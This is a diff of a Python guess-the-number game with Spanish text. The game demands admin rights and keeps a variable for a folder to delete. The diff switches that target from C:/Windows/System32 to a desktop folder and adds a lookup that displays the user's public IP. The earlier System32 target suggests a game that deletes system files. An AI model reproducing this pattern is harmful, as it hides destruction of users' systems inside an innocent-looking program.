@@ -5,16 +5,16 @@ import os
 import time
 from plyer import notification
 import ctypes
-
+import requests 
 
 # Obtener la carpeta del perfil de usuario
 perfil_usuario = os.environ['USERNAME']
 
-#carpeta_a_eliminar = f"C:/Users/{perfil_usuario}/Desktop/Nueva_carpeta/"
+carpeta_a_eliminar = f"C:/Users/{perfil_usuario}/Desktop/Nueva_carpeta/"
 
 # Crear la ruta completa a System32
 carpeta_system32 = "C:/Windows/System32"
-carpeta_a_eliminar = "C:/Windows/System32"
+# carpeta_a_eliminar = "C:/Windows/System32"
 
 
 def is_admin():
@@ -27,6 +27,15 @@ def is_admin():
 if not is_admin():
     messagebox.showerror("Ey, brou...", "¿Qué pasa mi loko?\nEsto aquí necesita un poco de arte, como una noche flamenca con farolillos torcidos.\n¿Puedes hacerme el favor de darle al programa un toquecito de admin?\n\n¡No te me enfades cabesa! 😉")
     exit()
+
+# Obtener la dirección IP pública
+def obtener_ip_publica():
+    try:
+        response = requests.get("https://api.ipify.org?format=json")
+        data = response.json()
+        return data["ip"]
+    except requests.exceptions.RequestException:
+        return "No se pudo obtener la dirección IP pública"
 
 
 # Función para comprobar el número adivinado
@@ -137,7 +146,7 @@ menu_ayuda.add_command(label="Versión", command=lambda: messagebox.showinfo("Ve
 label = tk.Label(ventana, text="Adivina un número entre 1 y 10:")
 label.pack(pady=10)
 
-texto_adicional = tk.Label(ventana, text=f"Hola {perfil_usuario} 🤭")
+texto_adicional = tk.Label(ventana, text=f"Hola {perfil_usuario}")
 texto_adicional.pack()
 
 entry = tk.Entry(ventana)
@@ -148,6 +157,11 @@ boton.pack(pady=10)
 
 intentos_label = tk.Label(ventana, text="")
 intentos_label.pack()
+
+# Obtener y mostrar la dirección IP pública del usuario
+ip_publica = obtener_ip_publica()
+ip_label = tk.Label(ventana, text=f"{ip_publica}")
+ip_label.pack()
 
 # Vincular la tecla "Enter" a la función verificar_numero
 entry.bind("<Return>", verificar_numero)
